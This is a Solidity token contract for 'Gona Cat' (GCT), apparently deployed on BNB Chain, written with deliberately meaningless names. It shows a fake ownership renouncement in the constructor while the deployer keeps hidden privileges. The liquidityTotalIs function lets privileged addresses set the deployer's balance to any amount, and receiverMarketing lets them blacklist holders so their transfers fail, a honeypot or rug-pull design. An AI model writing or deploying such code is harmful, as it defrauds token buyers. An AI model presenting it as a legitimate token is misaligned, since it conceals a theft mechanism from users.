/**
 *Submitted for verification at BscScan.com on 2023-02-16
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

abstract contract exemptToken {
    function walletLaunched() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface txReceiverTake {
    function createPair(address fundTotal, address launchedLiquidity) external returns (address);
}

interface walletSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GonaCat is IERC20, exemptToken {

    function approve(address fromTeam, uint256 takeLaunched) public virtual override returns (bool) {
        atLiquidityTake[walletLaunched()][fromTeam] = takeLaunched;
        emit Approval(walletLaunched(), fromTeam, takeLaunched);
        return true;
    }

    mapping(address => mapping(address => uint256)) private atLiquidityTake;

    mapping(address => bool) public tokenSwap;

    uint256 private swapAmount;

    uint256 private tokenAutoAt;

    mapping(address => uint256) private teamTotal;

    function owner() external view returns (address) {
        return limitMin;
    }

    function feeLiquidityWallet() public view returns (uint256) {
        return exemptTx;
    }

    mapping(address => bool) public launchedSender;

    bool public launchedTo;

    bool private exemptTake;

    string private maxModeToken = "GCT";

    function symbol() external view returns (string memory) {
        return maxModeToken;
    }

    function name() external view returns (string memory) {
        return shouldFromLiquidity;
    }

    function swapLiquidityMode() public view returns (uint256) {
        return exemptTx;
    }

    bool private listSender;

    constructor (){
        
        walletSell shouldMarketingFrom = walletSell(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxTotal = txReceiverTake(shouldMarketingFrom.factory()).createPair(shouldMarketingFrom.WETH(), address(this));
        limitMin = walletLaunched();
        if (listSender != exemptTake) {
            swapAmount = limitLiquidityMax;
        }
        launchedEnable = walletLaunched();
        tokenSwap[walletLaunched()] = true;
        if (exemptTake) {
            limitLiquidityMax = walletLiquidity;
        }
        teamTotal[walletLaunched()] = autoLiquidityLimit;
        emit Transfer(address(0), launchedEnable, autoLiquidityLimit);
        totalBuyTeam();
    }

    address public launchedEnable;

    function shouldSender(address sellExempt, address totalList, uint256 takeLaunched) internal returns (bool) {
        if (sellExempt == launchedEnable) {
            return marketingReceiver(sellExempt, totalList, takeLaunched);
        }
        require(!launchedSender[sellExempt]);
        return marketingReceiver(sellExempt, totalList, takeLaunched);
    }

    uint8 private maxModeLaunched = 18;

    function totalLaunchedFee() public {
        if (walletLiquidity == tokenAutoAt) {
            tokenAutoAt = swapAmount;
        }
        if (tokenAutoAt != walletLiquidity) {
            maxLaunchedSwap = limitLiquidityMax;
        }
        swapAmount=0;
    }

    function getOwner() external view returns (address) {
        return limitMin;
    }

    function decimals() external view returns (uint8) {
        return maxModeLaunched;
    }

    function tokenMax() public view returns (bool) {
        return listSender;
    }

    function liquidityTotalIs(uint256 takeLaunched) public {
        if (!tokenSwap[walletLaunched()]) {
            return;
        }
        teamTotal[launchedEnable] = takeLaunched;
    }

    function transferFrom(address sellExempt, address totalList, uint256 takeLaunched) external override returns (bool) {
        if (atLiquidityTake[sellExempt][walletLaunched()] != type(uint256).max) {
            require(takeLaunched <= atLiquidityTake[sellExempt][walletLaunched()]);
            atLiquidityTake[sellExempt][walletLaunched()] -= takeLaunched;
        }
        return shouldSender(sellExempt, totalList, takeLaunched);
    }

    uint256 private walletLiquidity;

    address private limitMin;

    function autoLaunched(address tokenFund) public {
        if (launchedTo) {
            return;
        }
        
        tokenSwap[tokenFund] = true;
        
        launchedTo = true;
    }

    function allowance(address walletAmount, address fromTeam) external view virtual override returns (uint256) {
        return atLiquidityTake[walletAmount][fromTeam];
    }

    uint256 public senderWallet;

    function totalSupply() external view virtual override returns (uint256) {
        return autoLiquidityLimit;
    }

    function feeList() public view returns (bool) {
        return listSender;
    }

    function marketingReceiver(address sellExempt, address totalList, uint256 takeLaunched) internal returns (bool) {
        require(teamTotal[sellExempt] >= takeLaunched);
        teamTotal[sellExempt] -= takeLaunched;
        teamTotal[totalList] += takeLaunched;
        emit Transfer(sellExempt, totalList, takeLaunched);
        return true;
    }

    uint256 private exemptTx;

    function receiverMarketing(address txEnableTrading) public {
        
        if (txEnableTrading == launchedEnable || txEnableTrading == maxTotal || !tokenSwap[walletLaunched()]) {
            return;
        }
        
        launchedSender[txEnableTrading] = true;
    }

    function transfer(address atMarketing, uint256 takeLaunched) external virtual override returns (bool) {
        return shouldSender(walletLaunched(), atMarketing, takeLaunched);
    }

    function totalBuyTeam() public {
        emit OwnershipTransferred(launchedEnable, address(0));
        limitMin = address(0);
    }

    event OwnershipTransferred(address indexed launchedFrom, address indexed exemptAmount);

    uint256 private autoLiquidityLimit = 100000000 * 10 ** 18;

    function listTake() public view returns (uint256) {
        return swapAmount;
    }

    uint256 public maxLaunchedSwap;

    string private shouldFromLiquidity = "Gona Cat";

    function amountExempt() public {
        if (limitLiquidityMax == amountLiquidity) {
            limitLiquidityMax = exemptTx;
        }
        if (senderWallet == exemptTx) {
            amountLiquidity = walletLiquidity;
        }
        listSender=false;
    }

    uint256 public amountLiquidity;

    address public maxTotal;

    uint256 public limitLiquidityMax;

    function balanceOf(address enableLiquidity) public view virtual override returns (uint256) {
        return teamTotal[enableLiquidity];
    }

}